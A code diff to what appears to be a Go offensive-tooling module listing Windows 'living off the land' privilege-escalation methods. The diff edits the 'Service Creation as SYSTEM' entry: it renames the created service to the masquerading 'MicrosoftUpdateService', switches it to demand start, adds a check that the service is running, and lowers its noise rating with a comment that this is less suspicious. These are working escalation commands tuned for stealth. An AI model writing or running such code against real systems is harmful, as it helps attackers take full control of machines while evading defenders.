@@ -136,18 +136,19 @@ func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
 			NoiseLevel: "Medium",
 		},
 		{
-			Name:           "Service Creation as SYSTEM",
-			Description:    "Creates Windows service running as SYSTEM",
+			Name:           "Service Creation as SYSTEM (PsExec-Inspired)",
+			Description:    "Creates Windows service running as SYSTEM using PsExec's exact mechanism",
 			EscalationType: "Admin->System",
 			Commands: []string{
-				`sc create "WindowsUpdateService" binPath= "%s" type= own start= auto`,
-				`sc start "WindowsUpdateService"`,
+				`sc create "MicrosoftUpdateService" binPath= "%s" type= own start= demand error= normal`,
+				`sc start "MicrosoftUpdateService"`,
 				`timeout /t 3 /nobreak >nul 2>&1`,
-				`sc stop "WindowsUpdateService" 2>nul`,
-				`sc delete "WindowsUpdateService" 2>nul`,
+				`sc query "MicrosoftUpdateService" | findstr "RUNNING"`,
+				`sc stop "MicrosoftUpdateService" 2>nul`,
+				`sc delete "MicrosoftUpdateService" 2>nul`,
 			},
 			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
-			NoiseLevel: "Medium",
+			NoiseLevel: "Low", // Changed from Medium - demand start is less suspicious
 		},
 		{
 			Name:           "WMI Process Creation as SYSTEM",
